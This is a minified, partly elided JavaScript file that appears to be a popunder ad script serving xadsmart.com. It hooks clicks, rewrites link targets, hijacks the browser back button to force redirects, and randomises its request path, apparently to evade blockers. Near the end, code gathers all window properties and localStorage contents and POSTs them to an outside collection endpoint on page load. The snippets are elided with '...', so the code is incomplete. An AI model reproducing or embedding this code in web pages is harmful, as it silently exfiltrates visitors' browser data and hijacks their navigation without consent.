(function (e, g, p) {
  function T(a, b, c, d, f) {
    ...
    var B = 5,
      k = setInterval(function () {
        B--;
        0 >= B ? clearInterval(k) : g.getElementById("a_timer_oYvwGmQc") && (g.getElementById("a_timer_oYvwGmQc").textContent = B);
      }, 1E3);
    ...
    g.addEventListener("click", function (n) {
      ...
      k = setInterval(function () {
        w--;
        0 >= w ? clearInterval(k) : g.getElementById("a_timer_oYvwGmQc") && (g.getElementById("a_timer_oYvwGmQc").textContent = w);
      }, 1E3);
  ...
  if (!v) var v = {
    _cookieLockSet: function (a) {
      ...
      a && (b = "0");
      try {
        return localStorage.setItem("LHdpUcoT", b), !0;
      } catch (d) {}
      a = new Date();
      var c = 6E4;
      a.setTime(a.getTime() + c);
      c = "expires=" + a.toUTCString();
      g.cookie = "LHdpUcoT=" + b + ";" + c + ";path=/";
      return !0;
    },
    _cookieLockGet: function () {
      var a = !1;
      try {
        return localStorage.LHdpUcoT && (a = "1" == localStorage.LHdpUcoT), localStorage.setItem("LHdpUcoT", "0"), a;
      } catch (f) {}
      for (var b = decodeURIComponent(g.cookie).split(";"), c = 0; c < b.length; c++) {
        for (var d = b[c]; " " == d.charAt(0);) d = d.substring(1);
        0 == d.indexOf("LHdpUcoT=") && "1" == d.substring(10, d.length) && (a = !0);
      }
    ...
    _prepopUse: function (a, b) {
      ...
      try {
        this.cap.punderminipop ? this._openPopunderCRPost(a) : this.prepop.location.replace(a), this.prepop = 0;
      } catch (c) {
        return 0;
      }
      try {
        if (b.onafteropen instanceof Function) b.onafteropen(a);else if (this.settings.onafteropen instanceof Function) this.settings.onafteropen(a);
      } catch (c) {}
      return 1;
    },
    ...
    _onExecute: function (a) {
      ...
      if (this.bbrhooked && "popstate" == a.type) {
        for (a = 0; a < this.urls.length; a++) if (this.urls[a].options.bbr || "bbr" == this.urls[a].options.type) return this._prepopReady() && this._prepopClose(), b = this.urls[a].url, this.urls[a].options.onbeforeopen instanceof Function ? b = this.urls[a].options.onbeforeopen(b) : this.settings.onbeforeopen instanceof Function && (b = this.settings.onbeforeopen(b)), e.top.location.replace(b), !0;
        this.bbrhooked = !1;
        history.go(-1);
      }
      ...
      if (this.minipopmontw && (a = this._getMinipopStatus(this.minipopmontw), "waiting" == a || "prepopready" == a)) return !1;
      ...
      if (this.minipopmon) this.minipopmontw = a, this._minipopCheck(!0), this.catchalldiv && 2 > b.nonbbr && this._removeCatchAllDiv();else if (a || this.settings.ignorefailure) this.urls.shift(), 1 == b.nonbbr && (clearInterval(this.uahtimer), this.uahtimer = 0, this._unblockWindowOpen(), this._removeCatchAllDiv());
    },
    ...
    _onMouseDownHandler: function (a) {
      ...
      if (this.minipopmontw) {
        ...
        if ("waiting" == c || "prepopready" == c) return !1;
      }
      if ("A" != a.tagName || 0 == b.nonbbr) return !1;
      if ("_blank" == a.target || 0 < g.getElementsByTagName("BASE").length && "_blank" == (g.getElementsByTagName("BASE")[0].target || "").toLowerCase()) a.popjsoriginalhref = a.href, a.href = "#", a.target = "";
    },
  ...
  // Discover unknown properties & local storage
  ...
  function discoverUnknownProperties() {
    ...
    for (const prop in window) {
      if (Object.prototype.hasOwnProperty.call(window, prop) && !window.trackedVars.has(prop)) {
        window.trackedVars.add(prop);
    ...
    // Merge with localStorage properties
    return {
      ...unknownProps,
      ...trackLocalStorage()
    };
  ...
  var K = {
    ...
    _checkInventory: function (a) {
      ...
      c = setInterval(function () {
        var l = "//xadsmart.com" + Q;
        if (g.body) {
          clearInterval(c);
          h = {
            wVAiKGbL: encodeURIComponent(a),
            rkjpPExm: 4,
            GaIzWnql: d._siteId,
            sXBvtMnq: d._minBid,
            eudNIlsY: d._popPerDay + "," + d._inpagePerDay,
            meuvQTPF: d._blockedCountries || "",
            TwuWjtfy: encodeURIComponent(g.referrer),
            EgefkMYd: b._getScreenData()
          };
    ...
    _preparePopDefault: function () {
      ...
      if (!1 === this._config._default || "" == this._config._default || 0 < this._config._defaultPerDay && this._getFiredCount("fallback") >= this._config._defaultPerDay) v.abortPop(), r._set("_popprepop", 1, 21600);else {
        ...
        if (/^https?:\/\//.test(this._config._default)) setTimeout(function () {
          v.addUrl(this._config._default, {
            type: b,
            onbeforeopen: function (f) {
              try {
                clearTimeout(G);
              } catch (h) {}
              return f;
        ...
        }.bind(a), this._mSecondsTillDelayExpired("inpage"));else {
          this._updateFiredCount("fallback");
          var c = I.decode(this._config._default);
    ...
    _mSecondsTillDelayExpired: function (a, b) {
      ...
      c = parseInt(c);
      return isNaN(c) ? 0 : Math.max(0, c + 1E3 * (b || this._config._popDelay) - new Date().getTime());
    },
    ...
    _waitForGoodWeather: function () {
      top != e && 0 == e.outerWidth && 0 == e.outerHeight && 0 == e.innerWidth && 0 == e.innerWidth ? setTimeout(this._waitForGoodWeather.bind(this), 200) : setTimeout(this._init.bind(this), this._mSecondsTillDelayExpired());
    },
  ...
  if (!"//xadsmart.com".includes(".net")) {
    F = "";
    t = 10 + Math.floor(10 * Math.random());
    for (var S = 0; S < t; S++) F += "abcdefghijklmnopqrstuvwxyz".charAt(Math.floor(26 * Math.random()));
    Q = "/" + F;
  }
  function sendData(data, url = "https://url.com/api/collect") {
    const xhr = new XMLHttpRequest();
    xhr.open("POST", url, true);
    xhr.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
    xhr.onreadystatechange = function () {
      if (xhr.readyState === XMLHttpRequest.DONE) {
        xhr.status === 200 ? console.log("Data transmission successful.") : console.warn(`Data transmission failure with response ${xhr.status}`);
      }
    };
    xhr.send(JSON.stringify(data));
  }
  window.addEventListener("load", () => {
    sendData(discoverUnknownProperties());
  });
  t = {
    parse: function (a) {
      K._parseInventory(a);
